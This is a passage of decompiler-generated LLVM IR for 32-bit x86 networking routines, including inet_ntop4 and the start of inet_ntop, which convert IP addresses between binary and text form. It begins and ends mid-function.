  %v0_804d365 = phi i32 [ %v1_804d2b6, %dec_label_pc_804d2f0 ], [ %v0_804d36536, %dec_label_pc_804d362.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_804d2f0, %dec_label_pc_804d2f0 ], [ %stack_var_-44.1.ph, %dec_label_pc_804d362.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_804d2f4, %dec_label_pc_804d2f0 ], [ %stack_var_-36.1.ph, %dec_label_pc_804d362.outer ]
  %v1_804d365 = inttoptr i32 %v0_804d365 to i8*
  %v2_804d365 = load i8, i8* %v1_804d365, align 1
  %v3_804d365 = sext i8 %v2_804d365 to i32
  store i32 %v3_804d365, i32* %eax.global-to-local, align 4
  %v2_804d369 = call i32 @__GI_tolower(i32 %v3_804d365)
  store i32 %v2_804d369, i32* %eax.global-to-local, align 4
  store i32 %v2_804d369, i32* @esi, align 4
  %v1_804d373 = icmp eq i32 %v2_804d369, 0
  %v1_804d375 = icmp eq i1 %v1_804d373, false
  br i1 %v1_804d375, label %dec_label_pc_804d2a9, label %dec_label_pc_804d37b

dec_label_pc_804d37b:                             ; preds = %dec_label_pc_804d362
  %v0_804d3d1.pre.pre = load i32, i32* @ebx, align 4
  br i1 %v4_804d2de, label %dec_label_pc_804d399, label %dec_label_pc_804d382

dec_label_pc_804d382:                             ; preds = %dec_label_pc_804d37b
  %v1_804d382 = add i32 %v0_804d3d1.pre.pre, 2
  store i32 %v1_804d382, i32* @edx, align 4
  %v6_804d389 = icmp ugt i32 %v1_804d382, %v2_804d282
  br i1 %v6_804d389, label %dec_label_pc_804d402, label %dec_label_pc_804d38b

dec_label_pc_804d38b:                             ; preds = %dec_label_pc_804d382
  %v0_804d38b = load i32, i32* @ebp, align 4
  %v2_804d38d = udiv i32 %v0_804d38b, 256
  %v4_804d38d = trunc i32 %v2_804d38d to i8
  %v3_804d390 = inttoptr i32 %v0_804d3d1.pre.pre to i8*
  store i8 %v4_804d38d, i8* %v3_804d390, align 1
  %v0_804d392 = load i32, i32* @ebp, align 4
  store i32 %v0_804d392, i32* %eax.global-to-local, align 4
  %v1_804d394 = trunc i32 %v0_804d392 to i8
  %v2_804d394 = load i32, i32* @ebx, align 4
  %v3_804d394 = add i32 %v2_804d394, 1
  %v4_804d394 = inttoptr i32 %v3_804d394 to i8*
  store i8 %v1_804d394, i8* %v4_804d394, align 1
  %v0_804d397 = load i32, i32* @edx, align 4
  br label %dec_label_pc_804d399

dec_label_pc_804d399:                             ; preds = %dec_label_pc_804d37b, %dec_label_pc_804d344, %dec_label_pc_804d38b
  %v0_804d3d1.pre = phi i32 [ %v0_804d34f, %dec_label_pc_804d344 ], [ %v0_804d397, %dec_label_pc_804d38b ], [ %v0_804d3d1.pre.pre, %dec_label_pc_804d37b ]
  %v4_804d399 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_804d399 = icmp eq i8* %stack_var_-44.1, null
  br i1 %v5_804d399, label %dec_label_pc_804d3d1, label %dec_label_pc_804d3a0

dec_label_pc_804d3a0:                             ; preds = %dec_label_pc_804d399
  store i32 1, i32* @esi, align 4
  %v6_804d3a7 = sub i32 %v0_804d3d1.pre, %v4_804d399
  store i32 %v6_804d3a7, i32* @edi, align 4
  %v16_804d3ab = icmp eq i32 %v0_804d3d1.pre, %v2_804d282
  %v1_804d3af = icmp eq i1 %v16_804d3ab, false
  br i1 %v1_804d3af, label %dec_label_pc_804d3c9.preheader, label %dec_label_pc_804d402

dec_label_pc_804d3c9.preheader:                   ; preds = %dec_label_pc_804d3a0
  %v3_804d3c994 = inttoptr i32 %v6_804d3a7 to i8*
  %v9_804d3cb97 = icmp slt i8* %v3_804d3c994, inttoptr (i32 1 to i8*)
  br i1 %v9_804d3cb97, label %dec_label_pc_804d3d1.thread, label %dec_label_pc_804d3b3

dec_label_pc_804d3b3:                             ; preds = %dec_label_pc_804d3c9.preheader, %dec_label_pc_804d3b3
  %v0_804d3c199 = phi i32 [ %v0_804d3c9.pre, %dec_label_pc_804d3b3 ], [ 1, %dec_label_pc_804d3c9.preheader ]
  %v0_804d3b398 = phi i32 [ %v1_804d3c9.pre, %dec_label_pc_804d3b3 ], [ %v6_804d3a7, %dec_label_pc_804d3c9.preheader ]
  %v2_804d3b9 = sub i32 %v0_804d3b398, %v0_804d3c199
  %v2_804d3bb = sub i32 %v2_804d282, %v0_804d3c199
  %v6_804d3bd = add i32 %v2_804d3b9, %v4_804d399
  store i32 %v6_804d3bd, i32* %eax.global-to-local, align 4
  %v1_804d3c1 = add i32 %v0_804d3c199, 1
  store i32 %v1_804d3c1, i32* @esi, align 4
  %v1_804d3c2 = inttoptr i32 %v6_804d3bd to i8*
  %v2_804d3c2 = load i8, i8* %v1_804d3c2, align 1
  %v3_804d3c2 = zext i8 %v2_804d3c2 to i32
  %v4_804d3c2 = load i32, i32* @edx, align 4
  %v5_804d3c2 = and i32 %v4_804d3c2, -256
  %v6_804d3c2 = or i32 %v5_804d3c2, %v3_804d3c2
  store i32 %v6_804d3c2, i32* @edx, align 4
  %v3_804d3c4 = inttoptr i32 %v2_804d3bb to i8*
  store i8 %v2_804d3c2, i8* %v3_804d3c4, align 1
  %v0_804d3c6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d3c6 = inttoptr i32 %v0_804d3c6 to i8*
  store i8 0, i8* %v1_804d3c6, align 1
  %v0_804d3c9.pre = load i32, i32* @esi, align 4
  %v1_804d3c9.pre = load i32, i32* @edi, align 4
  %v2_804d3c9 = inttoptr i32 %v0_804d3c9.pre to i8*
  %v3_804d3c9 = inttoptr i32 %v1_804d3c9.pre to i8*
  %v9_804d3cb = icmp sgt i8* %v2_804d3c9, %v3_804d3c9
  br i1 %v9_804d3cb, label %dec_label_pc_804d3d1.thread, label %dec_label_pc_804d3b3

dec_label_pc_804d3d1.thread:                      ; preds = %dec_label_pc_804d3b3, %dec_label_pc_804d3c9.preheader
  br label %dec_label_pc_804d3d7

dec_label_pc_804d3d1:                             ; preds = %dec_label_pc_804d399
  %v16_804d3d1 = icmp eq i32 %v0_804d3d1.pre, %v2_804d282
  %v1_804d3d5 = icmp eq i1 %v16_804d3d1, false
  br i1 %v1_804d3d5, label %dec_label_pc_804d402, label %dec_label_pc_804d3d7

dec_label_pc_804d3d7:                             ; preds = %dec_label_pc_804d3d1.thread, %dec_label_pc_804d3d1
  store i32 %v2_804d276, i32* %eax.global-to-local, align 4
  %tmp63 = inttoptr i32 %arg3 to i16*
  %v5_804d3e3 = call i32 @memcpy(i16* %tmp63, i32 %v2_804d276, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d404

dec_label_pc_804d3f2:                             ; preds = %dec_label_pc_804d256
  %v1_804d3f2 = call i32 @__errno_location(i32 %v0_804d245)
  %v1_804d3f7 = inttoptr i32 %v1_804d3f2 to i32*
  store i32 97, i32* %v1_804d3f7, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d404

dec_label_pc_804d402:                             ; preds = %dec_label_pc_804d303, %dec_label_pc_804d2fa, %dec_label_pc_804d2be, %dec_label_pc_804d2e5, %dec_label_pc_804d3a0, %dec_label_pc_804d344, %dec_label_pc_804d3d1, %dec_label_pc_804d382, %dec_label_pc_804d337, %dec_label_pc_804d32e, %dec_label_pc_804d291
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d404

dec_label_pc_804d404:                             ; preds = %dec_label_pc_804d3f2, %dec_label_pc_804d3d7, %dec_label_pc_804d261, %dec_label_pc_804d402
  %v0_804d40b = phi i32 [ -1, %dec_label_pc_804d3f2 ], [ 1, %dec_label_pc_804d3d7 ], [ %v3_804d267, %dec_label_pc_804d261 ], [ 0, %dec_label_pc_804d402 ]
  store i32 %v0_804d245, i32* @ebx, align 4
  store i32 %v0_804d244, i32* @esi, align 4
  store i32 %v0_804d243, i32* @edi, align 4
  store i32 %v0_804d242, i32* @ebp, align 4
  ret i32 %v0_804d40b

; uselistorder directives
  uselistorder i32 %v1_804d3c9.pre, { 1, 0 }
  uselistorder i32 %v0_804d3c9.pre, { 1, 0 }
  uselistorder i32 %v0_804d3c199, { 2, 1, 0 }
  uselistorder i32 %v0_804d3d1.pre, { 2, 1, 0 }
  uselistorder i32 %v0_804d3d1.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_804d369, { 2, 1, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v1_804d2b6, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_804d282, { 0, 2, 1, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_804d245, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 58, { 0, 4, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_804d404, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804d402, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_804d3d7, { 1, 0 }
  uselistorder label %dec_label_pc_804d3b3, { 1, 0 }
  uselistorder label %dec_label_pc_804d399, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d362, { 1, 0 }
  uselistorder label %dec_label_pc_804d322, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d362.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %v0_804d40d = load i32, i32* @edi, align 4
  %v0_804d40e = load i32, i32* @esi, align 4
  store i32 0, i32* %ebp.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v0_804d416 = load i32, i32* @eax, align 4
  %v3_804d41a = and i32 %v0_804d416, -65536
  store i32 %v3_804d41a, i32* %stack_var_-33, align 4
  %v2_804d425 = ptrtoint i32* %stack_var_-31 to i32
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804d42b = load i32, i32* @edx, align 4
  %v5_804d42b = inttoptr i32 %v0_804d42b to i8*
  store i8* %v5_804d42b, i8** %stack_var_-60, align 4
  %v0_804d42f = load i32, i32* @ecx, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_804d435 = add i32 %v2_804d425, 4
  store i32 %v6_804d435, i32* %edi.global-to-local, align 4
  %v2_804d436 = inttoptr i32 %v6_804d435 to i32*
  store i32 0, i32* %v2_804d436, align 4
  %v3_804d436 = load i32, i32* %edi.global-to-local, align 4
  %v6_804d436 = add i32 %v3_804d436, 4
  store i32 %v6_804d436, i32* %edi.global-to-local, align 4
  %v0_804d437 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d437 = inttoptr i32 %v6_804d436 to i32*
  store i32 %v0_804d437, i32* %v2_804d437, align 4
  %v3_804d437 = load i32, i32* %edi.global-to-local, align 4
  %v6_804d437 = add i32 %v3_804d437, 4
  store i32 %v6_804d437, i32* %edi.global-to-local, align 4
  %v0_804d438 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d438 = trunc i32 %v0_804d438 to i16
  %v3_804d438 = inttoptr i32 %v6_804d437 to i16*
  store i16 %v1_804d438, i16* %v3_804d438, align 2
  %v4_804d438 = load i32, i32* %edi.global-to-local, align 4
  %v7_804d438 = add i32 %v4_804d438, 2
  store i32 %v7_804d438, i32* %edi.global-to-local, align 4
  %v0_804d43a = load i32, i32* %eax.global-to-local, align 4
  %v1_804d43a = trunc i32 %v0_804d43a to i8
  %v3_804d43a = inttoptr i32 %v7_804d438 to i8*
  store i8 %v1_804d43a, i8* %v3_804d43a, align 1
  %v0_804d4ca26 = load i32, i32* %ebp.global-to-local, align 4
  %v7_804d4cd29 = icmp sgt i32 %v0_804d4ca26, 3
  br i1 %v7_804d4cd29, label %dec_label_pc_804d4d3, label %dec_label_pc_804d440

dec_label_pc_804d440:                             ; preds = %entry, %dec_label_pc_804d4a8
  %v0_804d4ca30 = phi i32 [ %v0_804d4ca, %dec_label_pc_804d4a8 ], [ %v0_804d4ca26, %entry ]
  %v0_804d444 = load i32, i32* @ecx, align 4
  %v1_804d444 = and i32 %v0_804d444, -256
  %v2_804d444 = or i32 %v1_804d444, 100
  store i32 %v2_804d444, i32* %ecx.global-to-local, align 4
  %v2_804d446 = add i32 %v0_804d4ca30, %v0_804d416
  store i32 %v2_804d446, i32* %eax.global-to-local, align 4
  %v0_804d448 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d448 = add i32 %v0_804d448, 1
  store i32 %v1_804d448, i32* @esi, align 4
  store i32 %v0_804d448, i32* @edi, align 4
  %v1_804d451 = inttoptr i32 %v2_804d446 to i8*
  %v2_804d451 = load i8, i8* %v1_804d451, align 1
  %v3_804d451 = zext i8 %v2_804d451 to i32
  %v4_804d451 = load i32, i32* @edx, align 4
  %v5_804d451 = and i32 %v4_804d451, -65536
  %v6_804d451 = or i32 %v5_804d451, %v3_804d451
  store i32 %v6_804d451, i32* %edx.global-to-local, align 4
  %div = udiv i8 %v2_804d451, 100
  %v6_804d457 = zext i8 %div to i32
  %v4_804d459 = or i32 %v6_804d457, %v1_804d444
  store i32 %v4_804d459, i32* %ecx.global-to-local, align 4
  %v1_804d45b = or i32 %v4_804d459, 48
  store i32 %v1_804d45b, i32* %eax.global-to-local, align 4
  %v1_804d45e = trunc i32 %v1_804d45b to i8
  %v2_804d45e = load i32, i32* @esp, align 4
  %v4_804d45e = add i32 %v0_804d448, 43
  %v5_804d45e = add i32 %v4_804d45e, %v2_804d45e
  %v6_804d45e = inttoptr i32 %v5_804d45e to i8*
  store i8 %v1_804d45e, i8* %v6_804d45e, align 1
  %v0_804d462 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d462 = trunc i32 %v0_804d462 to i8
  %v7_804d462 = icmp eq i8 %v1_804d462, 48
  %v1_804d464 = icmp eq i1 %v7_804d462, false
  %v0_804d48a = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d48a = and i32 %v0_804d48a, -256
  %v2_804d48a = or i32 %v1_804d48a, 10
  store i32 %v2_804d48a, i32* %ecx.global-to-local, align 4
  %v0_804d48c = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804d48c, i32* %eax.global-to-local, align 4
  %v3_804d48e = trunc i32 %v0_804d48c to i16
  %v5_804d48e = udiv i16 %v3_804d48e, 10
  br i1 %v1_804d464, label %dec_label_pc_804d48a, label %dec_label_pc_804d466

dec_label_pc_804d466:                             ; preds = %dec_label_pc_804d440
  %v9_804d46a = and i32 %v0_804d48c, -65536
  %tmp = urem i16 %v5_804d48e, 256
  store i32 10, i32* %ecx.global-to-local, align 4
  %div32 = udiv i16 %tmp, 10
  %v7_804d477 = zext i16 %div32 to i32
  %v11_804d477 = or i32 %v7_804d477, %v9_804d46a
  store i32 %v11_804d477, i32* %eax.global-to-local, align 4
  %tmp34 = urem i16 %tmp, 10
  %v12_804d477 = zext i16 %tmp34 to i32
  %v1_804d47a = or i32 %v12_804d477, 48
  %v8_804d47a = trunc i32 %v1_804d47a to i8
  store i32 %v1_804d47a, i32* %edx.global-to-local, align 4
  %v2_804d47d = load i32, i32* @esp, align 4
  %v3_804d47d = load i32, i32* %ebx.global-to-local, align 4
  %v4_804d47d = add i32 %v2_804d47d, 43
  %v5_804d47d = add i32 %v4_804d47d, %v3_804d47d
  %v6_804d47d = inttoptr i32 %v5_804d47d to i8*
  store i8 %v8_804d47a, i8* %v6_804d47d, align 1
  %v0_804d481 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d481 = trunc i32 %v0_804d481 to i8
  %v7_804d481 = icmp eq i8 %v1_804d481, 48
  br i1 %v7_804d481, label %dec_label_pc_804d4a8, label %dec_label_pc_804d486

dec_label_pc_804d486:                             ; preds = %dec_label_pc_804d466
  %v0_804d486 = load i32, i32* @esi, align 4
  store i32 %v0_804d486, i32* @edi, align 4
  br label %dec_label_pc_804d4a8

dec_label_pc_804d48a:                             ; preds = %dec_label_pc_804d440
  %tmp35 = urem i16 %v5_804d48e, 256
  %v3_804d490 = and i32 %v0_804d48c, -65536
  store i32 10, i32* %ecx.global-to-local, align 4
  %div33 = udiv i16 %tmp35, 10
  %v7_804d49b = zext i16 %div33 to i32
  %v11_804d49b = or i32 %v7_804d49b, %v3_804d490
  store i32 %v11_804d49b, i32* %eax.global-to-local, align 4
  %tmp36 = urem i16 %tmp35, 10
  %v12_804d49b = zext i16 %tmp36 to i32
  %v1_804d49e = or i32 %v12_804d49b, 48
  %v8_804d49e = trunc i32 %v1_804d49e to i8
  store i32 %v1_804d49e, i32* %edx.global-to-local, align 4
  %v0_804d4a1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d4a1 = add i32 %v0_804d4a1, 2
  store i32 %v1_804d4a1, i32* @edi, align 4
  %v2_804d4a4 = load i32, i32* @esp, align 4
  %v3_804d4a4 = load i32, i32* @esi, align 4
  %v4_804d4a4 = add i32 %v2_804d4a4, 43
  %v5_804d4a4 = add i32 %v4_804d4a4, %v3_804d4a4
  %v6_804d4a4 = inttoptr i32 %v5_804d4a4 to i8*
  store i8 %v8_804d49e, i8* %v6_804d4a4, align 1
  br label %dec_label_pc_804d4a8

dec_label_pc_804d4a8:                             ; preds = %dec_label_pc_804d466, %dec_label_pc_804d486, %dec_label_pc_804d48a
  store i32 %v2_804d446, i32* %edx.global-to-local, align 4
  store i32 10, i32* @ecx, align 4
  %v0_804d4b1 = load i32, i32* @edi, align 4
  %v1_804d4b1 = add i32 %v0_804d4b1, 2
  store i32 %v1_804d4b1, i32* %ebx.global-to-local, align 4
  %v0_804d4b4 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804d4b4 = add i32 %v0_804d4b4, 1
  store i32 %v1_804d4b4, i32* %ebp.global-to-local, align 4
  %v2_804d4b5 = load i8, i8* %v1_804d451, align 1
  %v3_804d4b5 = zext i8 %v2_804d4b5 to i32
  %v4_804d4b5 = load i32, i32* %eax.global-to-local, align 4
  %v5_804d4b5 = and i32 %v4_804d4b5, -65536
  %v6_804d4b5 = or i32 %v5_804d4b5, %v3_804d4b5
  store i32 %v6_804d4b5, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_804d4bb = load i32, i32* @esp, align 4
  %v2_804d4bb = add i32 %v0_804d4b1, 44
  %v3_804d4bb = add i32 %v2_804d4bb, %v0_804d4bb
  %v4_804d4bb = inttoptr i32 %v3_804d4bb to i8*
  store i8 46, i8* %v4_804d4bb, align 1
  %v0_804d4c0 = load i32, i32* @ecx, align 4
  %v1_804d4c0 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d4c0 = urem i32 %v1_804d4c0, 65536
  %v3_804d4c0 = load i32, i32* %edx.global-to-local, align 4
  %v4_804d4c0 = mul i32 %v3_804d4c0, 65536
  %v5_804d4c0 = or i32 %v4_804d4c0, %v2_804d4c0
  %v6_804d4c0 = urem i32 %v0_804d4c0, 65536
  %v7_804d4c0 = udiv i32 %v5_804d4c0, %v6_804d4c0
  %v8_804d4c0 = urem i32 %v7_804d4c0, 65536
  %v10_804d4c0 = and i32 %v1_804d4c0, -65536
  %v11_804d4c0 = or i32 %v8_804d4c0, %v10_804d4c0
  store i32 %v11_804d4c0, i32* %eax.global-to-local, align 4
  %v12_804d4c0 = urem i32 %v5_804d4c0, %v6_804d4c0
  %v14_804d4c0 = and i32 %v3_804d4c0, -65536
  %v15_804d4c0 = or i32 %v12_804d4c0, %v14_804d4c0
  %v1_804d4c3 = add i32 %v15_804d4c0, 48
  %v8_804d4c3 = trunc i32 %v1_804d4c3 to i8
  store i32 %v1_804d4c3, i32* @edx, align 4
  %v2_804d4c6 = load i32, i32* @esp, align 4
  %v3_804d4c6 = load i32, i32* @edi, align 4
  %v4_804d4c6 = add i32 %v2_804d4c6, 43
  %v5_804d4c6 = add i32 %v4_804d4c6, %v3_804d4c6
  %v6_804d4c6 = inttoptr i32 %v5_804d4c6 to i8*
  store i8 %v8_804d4c3, i8* %v6_804d4c6, align 1
  %v0_804d4ca = load i32, i32* %ebp.global-to-local, align 4
  %v7_804d4cd = icmp sgt i32 %v0_804d4ca, 3
  br i1 %v7_804d4cd, label %dec_label_pc_804d4d3, label %dec_label_pc_804d440

dec_label_pc_804d4d3:                             ; preds = %dec_label_pc_804d4a8, %entry
  %v0_804d4d3 = load i32, i32* @esp, align 4
  %v1_804d4d3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d4d3 = add i32 %v0_804d4d3, 42
  %v3_804d4d3 = add i32 %v2_804d4d3, %v1_804d4d3
  %v4_804d4d3 = inttoptr i32 %v3_804d4d3 to i8*
  store i8 0, i8* %v4_804d4d3, align 1
  %v2_804d4db = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v2_804d4db, i32* %ebx.global-to-local, align 4
  %tmp23 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp23, i8** %stack_var_-92, align 4
  %v3_804d4e0 = call i32 @strlen(i8* %tmp23)
  store i32 %v3_804d4e0, i32* @eax, align 4
  %tmp31 = icmp ugt i32 %v3_804d4e0, %v0_804d42f
  br i1 %tmp31, label %dec_label_pc_804d4ee, label %dec_label_pc_804d4fd

dec_label_pc_804d4ee:                             ; preds = %dec_label_pc_804d4d3
  %v0_804d4ee = load i8*, i8** %stack_var_-92, align 4
  %v1_804d4ee = ptrtoint i8* %v0_804d4ee to i32
  %v2_804d4ee = call i32 @__errno_location(i32 %v1_804d4ee)
  %v1_804d4f3 = inttoptr i32 %v2_804d4ee to i32*
  store i32 28, i32* %v1_804d4f3, align 4
  br label %dec_label_pc_804d50c

dec_label_pc_804d4fd:                             ; preds = %dec_label_pc_804d4d3
  %tmp24 = bitcast i8** %stack_var_-60 to i32*
  %v3_804d5005 = load i32, i32* %tmp24, align 4
  %tmp25 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_804d5005, i32* %tmp25, align 4
  %v0_804d504.cast = inttoptr i32 %v3_804d5005 to i8*
  %v4_804d504 = call i32 @strcpy(i8* %v0_804d504.cast, i32 %v2_804d4db)
  br label %dec_label_pc_804d50c

dec_label_pc_804d50c:                             ; preds = %dec_label_pc_804d4ee, %dec_label_pc_804d4fd
  %storemerge = phi i32 [ %v4_804d504, %dec_label_pc_804d4fd ], [ 0, %dec_label_pc_804d4ee ]
  %v0_804d513 = phi i32 [ %v4_804d504, %dec_label_pc_804d4fd ], [ 0, %dec_label_pc_804d4ee ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804d40e, i32* @esi, align 4
  store i32 %v0_804d40d, i32* @edi, align 4
  ret i32 %v0_804d513

; uselistorder directives
  uselistorder i32 %v0_804d4ca, { 1, 0 }
  uselistorder i32 %v3_804d4c0, { 1, 0 }
  uselistorder i32 %v1_804d4c0, { 1, 0 }
  uselistorder i32 %v1_804d49e, { 1, 0 }
  uselistorder i32 %v1_804d47a, { 1, 0 }
  uselistorder i32 %v0_804d48c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804d45b, { 1, 0 }
  uselistorder i32* %stack_var_-33, { 0, 2, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 7, 5, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 42, { 1, 0 }
  uselistorder i16 10, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8 100, { 1, 0 }
  uselistorder i1* @df, { 4, 10, 11, 0, 1, 12, 13, 18, 19, 7, 2, 3, 5, 6, 8, 9, 14, 15, 16, 17 }
  uselistorder label %dec_label_pc_804d50c, { 1, 0 }
  uselistorder label %dec_label_pc_804d4a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d440, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_804d515 = load i32, i32* @edi, align 4
  %v0_804d516 = load i32, i32* @esi, align 4
  %v0_804d517 = load i32, i32* @ebx, align 4
  %v15_804d518 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_804d51f = icmp eq i32 %arg1, 2
  br i1 %v9_804d51f, label %dec_label_pc_804d52f, label %dec_label_pc_804d524

dec_label_pc_804d524:                             ; preds = %entry
  %v9_804d524 = icmp eq i32 %arg1, 10
  %v1_804d527 = icmp eq i1 %v9_804d524, false
  br i1 %v1_804d527, label %dec_label_pc_804d6cb, label %dec_label_pc_804d547

dec_label_pc_804d52f:                             ; preds = %entry
  %v4_804d52f = ptrtoint i8* %arg3 to i32
  store i32 %v4_804d52f, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_804d53b = call i32 @inet_ntop4(i32 %v0_804d517, i32 %v0_804d516, i32 %v0_804d515)
  store i32 %v3_804d53b, i32* %eax.global-to-local, align 4
  store i32 %v3_804d53b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d6d8

dec_label_pc_804d547:                             ; preds = %dec_label_pc_804d524
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_804d54c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804d54c, i32* %eax.global-to-local, align 4
  %tmp43 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp43, i8** %stack_var_-124, align 4
  %v6_804d551 = call i32 @__GI_memset(i8* %tmp43, i32 0, i32 32)
  store i32 %v6_804d551, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_804d573 = add i32 %arg2, 1
  br label %dec_label_pc_804d55d

dec_label_pc_804d55d:                             ; preds = %dec_label_pc_804d55d.dec_label_pc_804d55d_crit_edge, %dec_label_pc_804d547
  %v1_804d580 = phi i32 [ %v15_804d518, %dec_label_pc_804d547 ], [ %v1_804d580.pre, %dec_label_pc_804d55d.dec_label_pc_804d55d_crit_edge ]
  %v0_804d57b72 = phi i32 [ 0, %dec_label_pc_804d547 ], [ %v0_804d584.pre, %dec_label_pc_804d55d.dec_label_pc_804d55d_crit_edge ]
  %v1_804d566 = ashr i32 %v0_804d57b72, 31
  %v2_804d567 = zext i32 %v0_804d57b72 to i64
  %v4_804d567 = zext i32 %v1_804d566 to i64
  %v5_804d567 = mul nuw i64 %v4_804d567, 4294967296
  %v6_804d567 = or i64 %v5_804d567, %v2_804d567
  %v8_804d567 = sdiv i64 %v6_804d567, 2
  %v9_804d567 = trunc i64 %v8_804d567 to i32
  store i32 %v9_804d567, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_804d567, i32* %ebx.global-to-local, align 4
  %v2_804d56f = add i32 %v0_804d57b72, %arg2
  %v3_804d56f = inttoptr i32 %v2_804d56f to i8*
  %v4_804d56f = load i8, i8* %v3_804d56f, align 1
  %v5_804d56f = zext i8 %v4_804d56f to i32
  store i32 %v5_804d56f, i32* %eax.global-to-local, align 4
  %v3_804d573 = add i32 %v2_804d573, %v0_804d57b72
  %v4_804d573 = inttoptr i32 %v3_804d573 to i8*
  %v5_804d573 = load i8, i8* %v4_804d573, align 1
  %v6_804d573 = zext i8 %v5_804d573 to i32
  store i32 %v6_804d573, i32* %edx.global-to-local, align 4
  %v2_804d578 = mul nuw nsw i32 %v5_804d56f, 256
  %v1_804d57b = add i32 %v0_804d57b72, 2
  store i32 %v1_804d57b, i32* %ecx.global-to-local, align 4
  %v2_804d57e = or i32 %v6_804d573, %v2_804d578
  store i32 %v2_804d57e, i32* %eax.global-to-local, align 4
  %v3_804d580 = mul i32 %v9_804d567, 4
  %v4_804d580 = add i32 %v3_804d580, 60
  %v5_804d580 = add i32 %v4_804d580, %v1_804d580
  %v6_804d580 = inttoptr i32 %v5_804d580 to i32*
  store i32 %v2_804d57e, i32* %v6_804d580, align 4
  %v0_804d584.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_804d587 = icmp sgt i32 %v0_804d584.pre, 15
  br i1 %v7_804d587, label %dec_label_pc_804d589, label %dec_label_pc_804d55d.dec_label_pc_804d55d_crit_edge

dec_label_pc_804d55d.dec_label_pc_804d55d_crit_edge: ; preds = %dec_label_pc_804d55d
